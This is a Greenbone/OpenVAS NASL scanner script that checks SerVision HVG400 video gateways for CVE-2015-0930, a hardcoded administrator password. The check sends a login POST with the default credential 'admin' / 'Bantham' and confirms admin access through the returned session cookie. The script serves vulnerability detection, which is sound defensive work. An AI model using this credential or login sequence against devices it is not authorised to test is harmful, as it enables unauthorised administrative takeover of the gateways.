if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807072" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-0930" );
	script_bugtraq_id( 72433 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2016-02-16 16:15:07 +0530 (Tue, 16 Feb 2016)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "SerVision HVG Default Credentials Vulnerability" );
	script_tag( name: "summary", value: "This host is running SerVision HVG and is
  prone to default Hard-Coded Password security bypass vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP POST and
  check whether it is able to bypass authentication or not." );
	script_tag( name: "insight", value: "The flaw is due to SerVision HVG contains
  a hardcoded password that enables a user to log into the web interface with
  administrative rights." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  unauthenticated users to log into the web interface with administrative
  rights and gain administrative privileges on the device." );
	script_tag( name: "affected", value: "SerVision HVG400 Video Gateway devices with
  firmware before 2.2.26a100" );
	script_tag( name: "solution", value: "Upgrade to SerVision HVG Video Gateway
  devices with firmware 2.2.26a100 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://www.kb.cert.org/vuls/id/522460" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2016/Feb/57" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Default Accounts" );
	script_dependencies( "find_service.sc", "httpver.sc", "gb_default_credentials_options.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning", "default_credentials/disable_default_account_checks" );
	exit( 0 );
}
if(get_kb_item( "default_credentials/disable_default_account_checks" )){
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
hvgPort = http_get_port( default: 8080 );
url = "/index.htm";
buf = http_get_cache( item: url, port: hvgPort );
if(ContainsString( buf, "user_username" ) && ContainsString( buf, "user_password" )){
	host = http_host_name( port: hvgPort );
	postData = NASLString( "user_username=admin&user_password=Bantham&LOADED=1&TO_LOAD=index.htm" );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData, "\\r\\n" );
	res = http_send_recv( port: hvgPort, data: req );
	cookie = eregmatch( pattern: "Set-Cookie: ([0-9a-zA-Z=]+);", string: res );
	if(!cookie[1]){
		exit( 0 );
	}
	if(res && IsMatchRegexp( res, "HTTP\\/1\\.[0-9] 201 OK" )){
		req = NASLString( "GET /top.htm HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", cookie[1], "\\r\\n", "Connection: keep-alive\\r\\n\\r\\n" );
		res = http_keepalive_send_recv( port: hvgPort, data: req );
		if(IsMatchRegexp( res, "HTTP\\/1\\.[0-9] 200 OK" ) && ContainsString( res, "Logout" )){
			report = http_report_vuln_url( port: hvgPort, url: url );
			security_message( port: hvgPort, data: report );
			exit( 0 );
		}
	}
}

